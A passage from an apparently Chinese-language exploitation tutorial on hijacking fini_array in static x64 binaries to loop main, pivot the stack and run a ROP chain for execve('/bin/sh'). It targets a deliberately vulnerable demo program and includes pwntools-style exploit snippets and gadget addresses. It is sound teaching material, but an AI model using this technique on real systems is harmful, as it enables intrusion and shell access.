class="number">8</span>]</span><br></pre></td></tr></table></figure></div><blockquote><p><code>rbp</code>即为<code>fini_array</code>，因此这里将调用<code>fini_array</code>中的函数</p></blockquote><p>只要修改<code>fini_array</code>中的值，就可以实现<strong>控制流的转移</strong>啦（传说中的<code>fini_array</code>劫持）</p><p>这里分析的64位的静态编译程序，可见其中的<code>__libc_csu_fini</code>函数简直好用的不得了鸭，既可以完成<strong>栈迁移</strong>，又能够劫持<strong>控制流</strong></p><blockquote><p>动态链接的程序<code>__libc_csu_fini</code>很短，并没有上述指令..但是也有类似fini_array的函数指针</p></blockquote><h1 id="0x2-fini-array分析"><a href="#0x2-fini-array分析" class="headerlink" title="0x2 fini_array分析"></a>0x2 fini_array分析</h1><p><code>fini_array</code>的地址可通过查看静态编译程序的<code>section</code>信息获得：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfheader </span><br><span class="line"><span class="number">0x400200</span> - <span class="number">0x400224</span>  .note.gnu.build-id</span><br><span class="line"><span class="number">0x400224</span> - <span class="number">0x400244</span>  .note.ABI-tag</span><br><span class="line"><span class="number">0x400248</span> - <span class="number">0x400470</span>  .rela.plt</span><br><span class="line"><span class="number">0x401000</span> - <span class="number">0x401017</span>  .init</span><br><span class="line"><span class="number">0x401018</span> - <span class="number">0x4010d0</span>  .plt</span><br><span class="line"><span class="number">0x4010d0</span> - <span class="number">0x48d630</span>  .<span class="built_in">text</span></span><br><span class="line"><span class="number">0x48d630</span> - <span class="number">0x48f52b</span>  __libc_freeres_fn</span><br><span class="line"><span class="number">0x48f52c</span> - <span class="number">0x48f535</span>  .fini</span><br><span class="line"><span class="number">0x490000</span> - <span class="number">0x4a95dc</span>  .rodata</span><br><span class="line"><span class="number">0x4a95dc</span> - <span class="number">0x4a95dd</span>  .stapsdt.base</span><br><span class="line"><span class="number">0x4a95e0</span> - <span class="number">0x4b3d00</span>  .eh_frame</span><br><span class="line"><span class="number">0x4b3d00</span> - <span class="number">0x4b3da9</span>  .gcc_except_table</span><br><span class="line"><span class="number">0x4b5080</span> - <span class="number">0x4b50a0</span>  .tdata</span><br><span class="line"><span class="number">0x4b50a0</span> - <span class="number">0x4b50b0</span>  .init_array</span><br><span class="line"><span class="number">0x4b50a0</span> - <span class="number">0x4b50e0</span>  .tbss</span><br><span class="line"><span class="number">0x4b50b0</span> - <span class="number">0x4b50c0</span>  .fini_array</span><br><span class="line"><span class="number">0x4b50c0</span> - <span class="number">0x4b7ef4</span>  .data.rel.ro</span><br><span class="line"><span class="number">0x4b7ef8</span> - <span class="number">0x4b7fe8</span>  .got</span><br><span class="line"><span class="number">0x4b8000</span> - <span class="number">0x4b80d0</span>  .got.plt</span><br><span class="line"><span class="number">0x4b80e0</span> - <span class="number">0x4b9bf0</span>  .data</span><br><span class="line"><span class="number">0x4b9bf0</span> - <span class="number">0x4b9c38</span>  __libc_subfreeres</span><br><span class="line"><span class="number">0x4b9c40</span> - <span class="number">0x4ba2e8</span>  __libc_IO_vtables</span><br><span class="line"><span class="number">0x4ba2e8</span> - <span class="number">0x4ba2f0</span>  __libc_atexit</span><br><span class="line"><span class="number">0x4ba300</span> - <span class="number">0x4bba78</span>  .bss</span><br><span class="line"><span class="number">0x4bba78</span> - <span class="number">0x4bbaa0</span>  __libc_freeres_ptrs</span><br></pre></td></tr></table></figure></div><p>其中<code>0x4b50b0 - 0x4b50c0</code>即<code>.fini_array</code>数组，其中存在两个函数指针：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">2</span>xg <span class="number">0x4b50b0</span></span><br><span class="line"><span class="number">0x4b50b0</span>:<span class="number">0x0000000000401b10</span><span class="number">0x0000000000401580</span></span><br><span class="line">pwndbg&gt; x/i <span class="number">0x0000000000401b10</span></span><br><span class="line">   <span class="number">0x401b10</span> &lt;__do_global_dtors_aux&gt;:cmp    BYTE PTR [rip+<span class="number">0xb87e9</span>],<span class="number">0x0</span></span><br><span class="line">pwndbg&gt; x/i <span class="number">0x0000000000401580</span></span><br><span class="line">   <span class="number">0x401580</span> &lt;fini&gt;:mov    rax,QWORD PTR [rip+<span class="number">0xb9b71</span>]</span><br></pre></td></tr></table></figure></div><blockquote><p><code>array[0]</code>-&gt;<code>__do_global_dtors_aux</code><br><code>array[1]</code>-&gt;<code>fini</code></p></blockquote><p>这两个函数都会在<code>main</code>执行完毕后执行，因此只要<strong>覆盖这两个函数指针，即可实现控制流的劫持</strong></p><blockquote><p>此外，静态链接的程序也有<code>PLT</code>表和<code>GOT</code>表，也可以覆盖通过<code>GOT</code>中的函数指针实现控制流劫持</p></blockquote><p>上述<code>fini_array</code>中的两个函数指针在<code>__libc_csu_fini</code>（上文说的那位兄弟）中被执行</p><p><strong>执行的顺序是<code>array[1]-&gt;array[0]</code></strong>(后有详解)</p><h1 id="0x3-一种好玩儿的利用方式"><a href="#0x3-一种好玩儿的利用方式" class="headerlink" title="0x3 一种好玩儿的利用方式"></a>0x3 一种好玩儿的利用方式</h1><h2 id="循环大法"><a href="#循环大法" class="headerlink" title="循环大法"></a>循环大法</h2><p>一种比较好玩儿的操作：</p><ul><li>把<code>array[0]</code>的值覆盖为那位兄弟（<code>__libc_csu_fini</code>函数）的地址</li><li>把<code>array[1]</code>的值覆盖为另一个函数地址，就叫他<code>addrA</code>吧</li></ul><p>于是，<code>main</code>执行完毕后执行<code>__libc_csu_fini</code>，于是有意思的来了！</p><ul><li><code>__libc_csu_fini</code>先执行一遍<code>array[1]:addrA</code>，返回后再执行<code>array[0]:__libc_csu_fini</code></li><li><code>__libc_csu_fini</code>先执行一遍<code>array[1]:addrA</code>，返回后再执行<code>array[0]:__libc_csu_fini</code></li><li><code>__libc_csu_fini</code>先执行一遍<code>array[1]:addrA</code>，返回后再执行<code>array[0]:__libc_csu_fini</code></li><li>……</li></ul><p>看！连起来啦~ <code>main</code>-&gt;<code>__libc_csu_fini</code>-&gt;<code>addrA</code>-&gt;<code>__libc_csu_fini</code>-&gt;<code>addrA</code>-&gt; <code>......</code></p><blockquote><p>因吹斯汀~</p></blockquote><h2 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h2><p>详细的过程如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x402bd1</span> &lt;__libc_csu_fini+<span class="number">1</span>&gt;:lea    rax,[rip+<span class="number">0xb24e8</span>]        # <span class="number">0x4b50c0</span> </span><br><span class="line"><span class="number">0x402bd8</span> &lt;__libc_csu_fini+<span class="number">8</span>&gt;:lea    rbp,[rip+<span class="number">0xb24d1</span>]        # <span class="number">0x4b50b0</span> </span><br><span class="line"><span class="number">0x402bdf</span> &lt;__libc_csu_fini+<span class="number">15</span>&gt;:push   rbx</span><br><span class="line"><span class="number">0x402be0</span> &lt;__libc_csu_fini+<span class="number">16</span>&gt;:sub    rax,rbp</span><br><span class="line"><span class="number">0x402be3</span> &lt;__libc_csu_fini+<span class="number">19</span>&gt;:sub    rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x402be7</span> &lt;__libc_csu_fini+<span class="number">23</span>&gt;:sar    rax,<span class="number">0x3</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>rax = 0x4b50c0 - 0x4b50b0 = 0x10</code><br><code>rax = 0x10 &gt;&gt; 3 = 2</code></p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x402bed</span> &lt;__libc_csu_fini+<span class="number">29</span>&gt;:lea    rbx,[rax<span class="number">-0x1</span>]</span><br><span class="line"><span class="number">0x402bf1</span> &lt;__libc_csu_fini+<span class="number">33</span>&gt;:nop    DWORD PTR [rax+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x402bf8</span> &lt;__libc_csu_fini+<span class="number">40</span>&gt;:call   QWORD PTR [rbp+rbx*<span class="number">8</span>+<span class="number">0x0</span>]</span><br></pre></td></tr></table></figure></div><blockquote><p><code>rbx = rax-1 = 1</code><br><code>call [rbp+rbx*8+0x0]</code>即<code>call array[1]</code>即<code>call addrA</code></p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x402bfc</span> &lt;__libc_csu_fini+<span class="number">44</span>&gt;:sub    rbx,<span class="number">0x1</span></span><br><span class="line"><span class="number">0x402c00</span> &lt;__libc_csu_fini+<span class="number">48</span>&gt;:cmp    rbx,<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x402c04</span> &lt;__libc_csu_fini+<span class="number">52</span>&gt;:jne    <span class="number">0x402bf8</span> &lt;__libc_csu_fini+<span class="number">40</span>&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p><code>addrA</code>执行完毕后返回到<code>0x402bfc</code><br><code>rbx = rbp - 1 = 0</code><br><code>rbx != -1</code>，满足跳转条件</p></blockquote><p>于是，程序控制流又回到了那位兄弟手中：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x402bf8</span> &lt;__libc_csu_fini+<span class="number">40</span>&gt;:call   QWORD PTR [rbp+rbx*<span class="number">8</span>+<span class="number">0x0</span>]</span><br></pre></td></tr></table></figure></div><p>此时执行的是<code>call array[1]</code>即<code>call __libc_csu_fini</code>（<code>call</code>自己个儿啊）</p><p>于是循环往复，只要<code>array[0]</code>中的<code>__libc_csu_fini</code>值不变，程序就会一直循环执行<code>addrA</code></p><p>当然，将<code>array[1]</code>中的<code>addrA</code>改成其他的<code>addrB</code>、<code>addrC</code>也都会执行</p><p>想要<strong>终止循环</strong>，只需把<code>array[0]</code>中的<code>__libc_csu_fini</code>换掉即可</p><p>就这样，那位兄弟只要占住了<code>array[0]</code>这个坑，就可以让<code>addrA</code>无限次的执行下去啦</p><h2 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h2><ol><li><p><code>x64</code>静态编译程序，劫持<code>fini_array</code></p><ul><li><code>array[0]</code>覆盖为<code>__libc_csu_fini</code></li><li><code>array[1]</code>覆盖为另一地址<code>addrA</code></li></ul></li><li><p>程序将循环执行<code>addrA</code></p></li><li><p>终止条件为<code>array[0]</code>不再为<code>__libc_csu_fini</code></p></li></ol><p>相当于：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="built_in">array</span>[<span class="number">0</span>] == __libc_csu_fini)&#123;</span><br><span class="line">addrA();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这其实是一种可以让<strong>漏洞被重复利用</strong>的方式，比如<code>addrA</code>中存在任意写<strong>一</strong>字节内存漏洞，通过上面这个循环就可以将漏洞放大，实现任意写<strong>多</strong>字节</p><h1 id="0x4-ROP攻击"><a href="#0x4-ROP攻击" class="headerlink" title="0x4 ROP攻击"></a>0x4 ROP攻击</h1><p>上述利用方式可以与<code>ROP</code>攻击相结合</p><blockquote><p>虽说直接用one_gadget比较方便，但是有时还是需要用到ROP的…</p></blockquote><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>由于劫持控制流的位置是在程序执行完毕后的<code>fini_array</code>中，因此在ROP攻击前，需要先进行<strong>栈迁移</strong>：</p><blockquote><p><code>leave; ret</code>相当于执行如下操作：</p><ul><li><code>mov rsp, rbp</code>    (<code>fini_array</code>-&gt;<code>rsp</code>)</li><li><code>pop rbp</code>              (<code>fini_array</code>-&gt;<code>rbp</code>)</li><li><code>ret</code>                      (<code>fini_array+0x8</code>-&gt;<code>ret</code> )</li></ul></blockquote><p>这里有两种栈迁移方法：</p><p>第一种：在<code>array[1]</code>处迁移栈（需迁移两次）</p><ul><li><code>fini_array+0x0:(data)fini_array+0x8</code></li><li><code>fini_array+0x8:(gadget)leave_ret</code></li><li><code>fini_array+0x10:rop chain</code></li></ul><p>第二种：跳过<code>array[1]</code>，在<code>array[0]</code>处迁移栈</p><ul><li><code>fini_array+0x0</code>:<code>(gadget)leave_ret</code></li><li><code>fini_array+0x8</code>:<code>(gadget)ret</code></li><li><code>fini_array+0x10:rop chain</code></li></ul><p>这两种方法都可以达到栈迁移的目的，直接说比较难理解，待会实际调试一下就明白啦（下面有例子）</p><p>总之，向<code>fini_array+0x10</code>,<code>fini_array+0x18...</code>中依次布置<code>gadget</code></p><p>构造好了<code>ROP</code>链，就可以完成<code>ROP</code>攻击啦~</p><h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"addr:"</span>,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>,&amp;buf,<span class="number">200</span>);</span><br><span class="line"><span class="keyword">int</span> *addr = buf;</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"data:"</span>,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>,*addr,<span class="number">24</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc demo.c -no-pie --static -o demo</span></span><br></pre></td></tr></table></figure></div><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>很明显，存在任意写内存的漏洞，可以改写任意内存位置的连续24个字节。利用方式如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">'addr:'</span>)</span><br><span class="line">sl(p64(addr))</span><br><span class="line">ru(<span class="string">'data:'</span>)</span><br><span class="line">se(p64(data1)+p64(data2)+p64(data3))</span><br></pre></td></tr></table></figure></div><h3 id="漏洞放大"><a href="#漏洞放大" class="headerlink" title="漏洞放大"></a>漏洞放大</h3><p>24字节显然不够，于是可以用上文提到的循环大法：</p><blockquote><p> <code>array[0]</code>-&gt;<code>__libc_csu_fini</code><br><code>array[1]</code>-&gt;<code>main</code></p></blockquote><p>让<code>main</code>函数多执行几次，这样就可以控制足够大的内存空间，往里面布置<code>ROP</code>链啦~</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>就这个栗子而言，<code>ROP</code>攻击的思路大概是这样：</p><ul><li>利用任意写，劫持<code>fini_array</code></li><li>循环执行<code>main</code>，利用任意写，将<code>ROP</code>链布置到<code>fini_array+0x10</code></li><li>终止循环，并将栈迁移到<code>fini_array+0x10</code>执行<code>ROP</code>链</li></ul><h3 id="劫持fini-array-循环利用"><a href="#劫持fini-array-循环利用" class="headerlink" title="劫持fini_array+循环利用"></a>劫持fini_array+循环利用</h3><p>改写<code>fini_array</code>的两个函数指针，开启循环大法：</p><blockquote><p><code>array[0]</code>-&gt;<code>__libc_csu_fini</code><br><code>array[1]</code>-&gt;<code>main</code></p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">'addr:'</span>)</span><br><span class="line">sl(p64(fini_array))</span><br><span class="line">ru(<span class="string">'data:'</span>)</span><br><span class="line">se(p64(libc_csu_fini)+p64(main))</span><br></pre></td></tr></table></figure></div><h3 id="布置ROP链"><a href="#布置ROP链" class="headerlink" title="布置ROP链"></a>布置ROP链</h3><p>执行<code>SYS_execve(&#39;/bin/sh&#39;,0,0)</code>，需要完成以下寄存器的布局：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAX  <span class="number">0x3b</span></span><br><span class="line">RDI  addr -&gt; '/bin/sh'</span><br><span class="line">RDX  <span class="number">0</span></span><br><span class="line">RSI  <span class="number">0</span></span><br></pre></td></tr></table></figure></div><p>对应的<code>ROP</code>链如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi=<span class="number">0x00000000004016a6</span>     <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000447bbc</span>     <span class="comment"># pop rax ; ret</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x000000000044a659</span> <span class="comment"># pop rdx ; pop rsi ; ret</span></span><br><span class="line">syscall = <span class="number">0x0000000000402434</span>   <span class="comment"># syscall</span></span><br><span class="line">bin_sh_addr=fini_array+<span class="number">0x50</span>    <span class="comment"># ropchain start at fini_array+0x10</span></span><br><span class="line"></span><br><span class="line">ropchain = [p64(pop_rdi),p64(bin_sh_addr),</span><br><span class="line">            p64(pop_rax),p64(<span class="number">0x3b</span>),</span><br><span class="line">            p64(pop_rdx_rsi),p64(<span class="number">0</span>),p64(<span class="number">0</span>),</span><br><span class="line">            p64(syscall),</span><br><span class="line">            <span class="string">"/bin/sh\x00"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># write ropchain to fini_array</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ropchain)):</span><br><span class="line">    ru(<span class="string">'addr:'</span>)</span><br><span class="line">    sl(p64(fini_array+<span class="number">0x10</span>+i*<span class="number">8</span>))</span><br><span class="line">    ru(<span class="string">'data:'</span>)</span><br><span class="line">    se(ropchain[i])</span><br></pre></td></tr></table></figure></div><h3 id="跳出循环"><a href="#跳出循环" class="headerlink" title="跳出循环"></a>跳出循环</h3><p>布置完<code>ROP</code>链，就可以跳出循环了，改写<code>fini_array</code>中的函数指针，顺便准备栈迁移</p><blockquote><p><code>array[0]</code>-&gt;<code>gadget:leave;ret</code><br><code>array[1]</code>-&gt;<code>gadget:ret</code></p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">'addr:'</span>)</span><br><span class="line">sl(p64(fini_array))</span><br><span class="line">ru(<span class="string">'data:'</span>)</span><br><span class="line">se(p64(leave)+p64(ret)) <span class="comment"># break loop and stack pivot</span></span><br></pre></td></tr></table></figure></div><h3 id="栈迁移-1"><a href="#栈迁移-1" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>跳出循环后，通过<code>leave_ret</code>完成<strong>栈迁移</strong>，执行<code>ROP</code>链：</p><p>这里用的是上文中的第二种栈迁移方式：</p><ul><li><code>fini_array+0x0</code>:<code>(gadget)leave_ret</code></li><li><code>fini_array+0x8</code>:<code>(gadget)ret</code></li><li><code>fini_array+0x10:rop chain</code></li></ul><p>这是因为循环大法中的<code>array[1]</code>是<code>main</code>，<code>main</code>返回后将执行<code>array[0]</code>处的函数：</p><p><code>leave</code>执行前：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">0x401c29</span> &lt;main+<span class="number">172</span>&gt;              leave  </span><br><span class="line">   <span class="number">0x401c2a</span> &lt;main+<span class="number">173</span>&gt;              ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x401016</span> &lt;_init+<span class="number">22</span>&gt;              ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x4016a6</span> &lt;init_cacheinfo+<span class="number">230</span>&gt;    pop    rdi</span><br><span class="line">   <span class="number">0x4016a7</span> &lt;init_cacheinfo+<span class="number">231</span>&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x447bbc</span> &lt;__open_nocancel+<span class="number">92</span>&gt;    pop    rax</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>xg $rsp</span><br><span class="line"><span class="number">0x7fff85f385c8</span>:<span class="number">0x0000000000402bfc</span><span class="number">0x00000000004b50f8</span></span><br><span class="line"><span class="number">0x7fff85f385d8</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000004b50b0</span></span><br><span class="line"><span class="number">0x7fff85f385e8</span>:<span class="number">0x0000000000402bfc</span><span class="number">0x00000000004b50f0</span></span><br><span class="line"><span class="number">0x7fff85f385f8</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000004b50b0</span></span><br><span class="line"><span class="number">0x7fff85f38608</span>:<span class="number">0x0000000000402bfc</span><span class="number">0x00000000004b50e8</span></span><br></pre></td></tr></table></figure></div><p><code>leave</code>执行后，栈被迁移到<code>fini_array+0x8</code>，即<code>array[1]</code>，但是这里并不是<code>ROP</code>链的开始，因此需要在<code>array[1]</code>这里用只含<code>ret</code>一个指令的<code>gadget</code>，让控制流后移，进入到<code>fini_array+0x10</code>的<code>ROP</code>链中</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x401c29</span> &lt;main+<span class="number">172</span>&gt;              leave  </span><br><span class="line"> ► <span class="number">0x401c2a</span> &lt;main+<span class="number">173</span>&gt;              ret             &lt;<span class="number">0x401016</span>; _init+<span class="number">22</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x401016</span> &lt;_init+<span class="number">22</span>&gt;              ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x4016a6</span> &lt;init_cacheinfo+<span class="number">230</span>&gt;    pop    rdi</span><br><span class="line">   <span class="number">0x4016a7</span> &lt;init_cacheinfo+<span class="number">231</span>&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x447bbc</span> &lt;__open_nocancel+<span class="number">92</span>&gt;    pop    rax</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>xg $rsp</span><br><span class="line"><span class="number">0x4b50b8</span>:<span class="number">0x0000000000401016</span><span class="number">0x00000000004016a6</span></span><br><span class="line"><span class="number">0x4b50c8</span>:<span class="number">0x00000000004b5100</span><span class="number">0x0000000000447bbc</span></span><br><span class="line"><span class="number">0x4b50d8</span>:<span class="number">0x000000000000003b</span><span class="number">0x000000000044a659</span></span><br><span class="line"><span class="number">0x4b50e8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x4b50f8</span>:<span class="number">0x0000000000402434</span><span class="number">0x0068732f6e69622f</span></span><br></pre></td></tr></table></figure></div><p><code>ROP</code>链执行完毕后就会执行<code>SYS_execve(&#39;/bin/sh&#39;,0,0)</code>啦~</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>最后，附上这个栗子的<code>exp</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 